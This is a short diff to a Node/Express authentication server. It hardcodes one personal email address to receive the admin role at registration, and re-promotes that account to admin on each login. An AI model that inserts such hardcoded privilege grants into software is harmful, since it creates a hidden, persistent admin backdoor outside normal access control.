@@ -84,7 +84,8 @@ app.post('/api/auth/register', async (req, res) => {
         name: email.split('@')[0],
         otp,
         otpExpires,
-        isVerified: false
+        isVerified: false,
+        role: email === 'maanvikram617@gmail.com' ? 'admin' : 'user'
       });
     }
 
@@ -142,6 +143,11 @@ app.post('/api/auth/login', async (req, res) => {
     }
     if (!user.isVerified) {
       return res.status(400).json({ error: 'Please complete registration first' });
+    }
+
+    if (user.email === 'maanvikram617@gmail.com' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
     }
 
     if (user.twoFactorEnabled) {
